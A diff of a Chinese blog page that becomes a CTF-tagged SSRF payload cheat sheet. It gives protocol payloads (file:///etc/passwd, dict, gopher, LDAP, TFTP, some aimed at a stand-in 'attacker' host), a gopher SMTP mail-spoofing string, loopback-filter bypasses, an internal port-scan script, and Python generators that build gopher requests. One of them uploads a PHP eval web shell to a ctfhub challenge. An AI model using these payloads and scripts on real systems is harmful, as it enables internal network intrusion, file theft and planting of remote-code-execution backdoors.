@@ -6,14 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives | cmacckk blog</title>
+  <title>SSRF | cmacckk blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="cmacckk blog">
-<meta property="og:url" content="http://example.com/archives/index.html">
+  <meta name="description" content="函数1234file_get_contents()curl()fsocksopen()fopen()  利用12345678910111213file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwdhttp:&#x2F;&#x2F;www.owasp.org.127.0.0.1.xip.io&#x2F;Dict:&#x2F;&#x2F;dict:&#x2F;&#x2F;&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;&#x2F;d:&lt;word&gt;s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF">
+<meta property="og:url" content="http://example.com/2021/06/04/SSRF/index.html">
 <meta property="og:site_name" content="cmacckk blog">
+<meta property="og:description" content="函数1234file_get_contents()curl()fsocksopen()fopen()  利用12345678910111213file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwdhttp:&#x2F;&#x2F;www.owasp.org.127.0.0.1.xip.io&#x2F;Dict:&#x2F;&#x2F;dict:&#x2F;&#x2F;&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;&#x2F;d:&lt;word&gt;s">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-06-04T14:28:38.000Z">
+<meta property="article:modified_time" content="2021-06-04T14:31:34.615Z">
 <meta property="article:author" content="John Doe   备案号:滇ICP备2021003344号">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="payload">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="cmacckk blog" type="application/atom+xml">
@@ -146,78 +152,106 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-SSRF" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/04/fileUpload/" class="archive-article-date">
-  	<time datetime="2021-06-04T14:33:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-04</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/fileUpload/">fileUpload</a>
+    <h1 class="article-title" itemprop="name">
+      SSRF
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">payload</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/04/SSRF/" class="archive-article-date">
+        
+        <a href="/2021/06/04/SSRF/" class="archive-article-date">
   	<time datetime="2021-06-04T14:28:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-04</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/SSRF/">SSRF</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">curl()</span><br><span class="line">fsocksopen()</span><br><span class="line">fopen()</span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
-          
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///etc/passwd</span></span><br><span class="line">http:<span class="comment">//www.owasp.org.127.0.0.1.xip.io/</span></span><br><span class="line">Dict:<span class="comment">//</span></span><br><span class="line">dict:<span class="comment">//&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span></span><br><span class="line">ssrf.php?url=dict:<span class="comment">//attacker:11111/</span></span><br><span class="line">SFTP:<span class="comment">//</span></span><br><span class="line">ssrf.php?url=sftp:<span class="comment">//example.com:11111/</span></span><br><span class="line">TFTP:<span class="comment">//</span></span><br><span class="line">ssrf.php?url=tftp:<span class="comment">//example.com:12346/TESTUDPPACKET</span></span><br><span class="line">LDAP:<span class="comment">//</span></span><br><span class="line">ssrf.php?url=ldap:<span class="comment">//localhost:11211/%0astats%0aquit</span></span><br><span class="line">Gopher:<span class="comment">//</span></span><br><span class="line">ssrf.php?url=gopher:<span class="comment">//127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1.xip.io/1.php</span></span><br><span class="line">http:<span class="comment">//127.0.0.1.nip.io/1.php</span></span><br><span class="line">http:<span class="comment">//127.0.0.1.sslip.io/1.php</span></span><br><span class="line">实际访问http:<span class="comment">//127.0.0.1/1.php</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="短链接"><a href="#短链接" class="headerlink" title="短链接"></a>短链接</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//4m.cn/</span></span><br><span class="line">http:<span class="comment">//dwz.cn/11SMa</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="@绕过"></a>@绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.baidu.com@127.0.0.1与http://127.0.0.1请求是相同的</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">有关file_get_contents()函数的一个trick，可以看作是SSRF的一个黑魔法，当PHP的 file_get_contents()函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞</span><br><span class="line">httpsssss://abc../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过端口"><a href="#绕过端口" class="headerlink" title="绕过端口"></a>绕过端口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ssrf.php?url=127.0.0.1:11211:80/1.txt</span><br><span class="line">读取11211端口下的1.txt文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key=8a6d748f4f820709cd9e444991d49dd0</span><br><span class="line"></span><br><span class="line">Content-Length来源为key=8a6d748f4f820709cd9e444991d49dd0长为36</span><br></pre></td></tr></table></figure>
+
+<h3 id="gopher-GET请求生成脚本"><a href="#gopher-GET请求生成脚本" class="headerlink" title="gopher GET请求生成脚本"></a>gopher GET请求生成脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parsepayload =\<span class="string">&quot;&quot;&quot;GET /echo.php?whoami=Bunny HTTP/1.1Host: 47.xxx.xxx.72&quot;&quot;&quot;</span>  <span class="comment"># 注意后面一定要有回车，回车结尾表示http请求结束tmp = urllib.parse.quote(payload)new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)result = &#x27;gopher://47.xxx.xxx.72:80/&#x27;+&#x27;_&#x27;+newprint(result)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="gopher-POST请求生成脚本"><a href="#gopher-POST请求生成脚本" class="headerlink" title="gopher POST请求生成脚本"></a>gopher POST请求生成脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /echo.php HTTP/1.1Host: 47.xxx.xxx.72Content-Type: application/x-www-form-urlencodedContent-Length: 12whoami=Bunny</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parsepayload =\<span class="string">&quot;&quot;&quot;POST /echo.php HTTP/1.1Host: 47.xxx.xxx.72Content-Type: application/x-www-form-urlencodedContent-Length: 12whoami=Bunny&quot;&quot;&quot;</span>  <span class="comment"># 注意后面一定要有回车，回车结尾表示http请求结束tmp = urllib.parse.quote(payload)new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)result = &#x27;gopher://47.xxx.xxx.72:80/&#x27;+&#x27;_&#x27;+newprint(result)</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">探测端口dict://192.168.0.1:80</span><br></pre></td></tr></table></figure>
+
+<h2 id="探测内网脚本"><a href="#探测内网脚本" class="headerlink" title="探测内网脚本"></a>探测内网脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-import requestsimport timeports = [&#x27;80&#x27;,&#x27;6379&#x27;,&#x27;3306&#x27;,&#x27;8080&#x27;,&#x27;8000&#x27;]session = requests.Session();for i in range(1, 255):    ip = &#x27;192.168.0.%d&#x27; % i #内网ip地址    for port in ports:        url = &#x27;http://ip/?url=http://%s:%s&#x27; %(ip,port)        try:            res = session.get(url,timeout=3)            if len(res.text) != 0 :    #这里长度根据实际情况改                print(ip,port,&#x27;is open&#x27;)        except:            continueprint(&#x27;Done&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST需要编码三次GET两次</span><br></pre></td></tr></table></figure>
+
+<h2 id="等同于127-0-0-1的地址"><a href="#等同于127-0-0-1的地址" class="headerlink" title="等同于127.0.0.1的地址"></a>等同于127.0.0.1的地址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://4m.cn/FjOdQhttp://2130706433http://0177.0.0.1http://0x7f.0.0.1http://0.0.0.0http://localhost/         # localhost就是代指127.0.0.1http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行http://[::]:80/           # 在liunx下可用，window测试了下不行http://127。0。0。1/       # 用中文句号绕过http://①②⑦.⓪.⓪.①http://127.1/http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><code>get.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;GET /echo.php?whoami=Bunny HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 47.xxx.xxx.72:80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line"><span class="comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://47.xxx.xxx.72:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p><code>post.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:80</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key=f75b4c4aca73b195b2884519c4c156f6</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line"><span class="comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;http://127.0.0.1/index.php?url=gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p><code>post2.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:80</span></span><br><span class="line"><span class="string">Content-Length: 335</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://challenge-82315504350037e1.sandbox.ctfhub.com:10080</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUkSlExxfdRqVgjXJ</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://challenge-82315504350037e1.sandbox.ctfhub.com:10080/?url=file:///var/www/html/flag.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryUkSlExxfdRqVgjXJ</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;cmacckk.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@eval($_REQUEST[&#x27;CMACCKK&#x27;]);</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryUkSlExxfdRqVgjXJ</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">鎻愪氦</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryUkSlExxfdRqVgjXJ--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line"><span class="comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;http://127.0.0.1/index.php?url=gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/wechat.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -233,175 +267,115 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/06/04/SSRF/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/04/cmdExecute/" class="archive-article-date">
-  	<time datetime="2021-06-04T14:27:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-04</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2021/06/04/fileUpload/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          fileUpload
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/06/04/cmdExecute/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">命令执行</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/cmdExecute/">命令执行</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">payload</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/04/VM2SandboxEscape/" class="archive-article-date">
-  	<time datetime="2021-06-04T14:23:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/VM2SandboxEscape/">VM2沙盒逃逸</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">payload</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/04/SSTI-payload/" class="archive-article-date">
-  	<time datetime="2021-06-04T14:13:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/SSTI-payload/">SSTI-payload</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">payload</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/04/OS%E6%8D%A2%E6%BA%90/" class="archive-article-date">
-  	<time datetime="2021-06-04T13:58:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/OS%E6%8D%A2%E6%BA%90/">OS换源</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">config</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -424,8 +398,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
